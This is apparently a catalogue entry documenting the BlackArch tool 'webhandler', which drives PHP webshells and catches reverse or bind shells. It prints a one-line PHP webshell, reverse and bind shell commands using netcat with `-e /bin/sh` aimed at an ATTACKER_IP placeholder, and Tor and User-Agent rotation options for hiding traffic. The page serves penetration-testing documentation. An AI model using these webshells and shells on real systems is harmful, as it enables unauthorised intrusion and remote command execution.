---
name: "webhandler"
categories:
  - blackarch-webapp
version: "348.1bd971e"
homepage: "https://github.com/lnxg33k/webhandler"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-26"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "lnxg33k/webhandler"
github-stars: 100
github-pushed: "2020-11-21"
github-archived: false
github-issues: 3
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# webhandler

> Simulated bash prompt that drives PHP system-function webshells, doubling as a netcat replacement for bind and reverse connections.

## What it's for

WebHandler (Python 2, by lnxg33k and g0tmi1k) wraps the tedious parts of post-exploitation webshells: given a page like `<?php system($_GET['cmd']); ?>`, it opens a shell-like prompt where every typed line is delivered as the command parameter and the output is rendered — over GET or POST. It also replaces netcat on your side: listen for a target connecting back, or attach to a bind shell the target exposes. It supports fixed and random User-Agents, extra custom headers, an HTTP proxy, and Tor. It handles one session at a time interactively; it is not a mass-management C2.

## Typical use cases

### Drive a GET webshell

Get a usable prompt on `shell.php?cmd=`-style access.

```
webhandler -u "http://target.example.com/shell.php?cmd="
```

Outcome: opens the simulated bash prompt; each line typed is URL-encoded into the `cmd` parameter of a GET request and the response body is displayed, with command history via readline.

### Drive a POST webshell

Interact with a shell that takes commands in the body.

```
webhandler -u http://target.example.com/shell.php -m post -p cmd
```

Outcome: same prompt, but commands travel as the POST body parameter `cmd`; the `-m post` and `-p` flags are required together, and GET mode takes no `-p`.

### Catch a reverse shell

Replace your `nc -lvnp` listener.

```
webhandler --listen 1234
```

Outcome: listens on port 1234; when the target connects back (e.g. `nc ATTACKER_IP 1234 -e /bin/sh`), the session drops into the same prompt — no separate netcat needed.

### Attach to a bind shell

Connect out to a shell waiting on the target.

```
webhandler --connect target.example.com:5678
```

Outcome: connects to the listener the target exposes (e.g. `nc -lp 5678 -e /bin/bash`) and wraps that session in the prompt instead of a raw netcat client.

### Route through a proxy with a rotated User-Agent

Keep the traffic in Burp and avoid a scripted-looking UA.

```
webhandler -u "http://target.example.com/shell.php?cmd=" -x http://127.0.0.1:8080 -rg
```

Outcome: all webshell requests go through the proxy and each carries a randomly chosen User-Agent; `-t` sends them over Tor instead.

*No corpus evidence — derived from upstream source (lnxg33k/webhandler README, webhandler.py, core/libs/menu.py).*
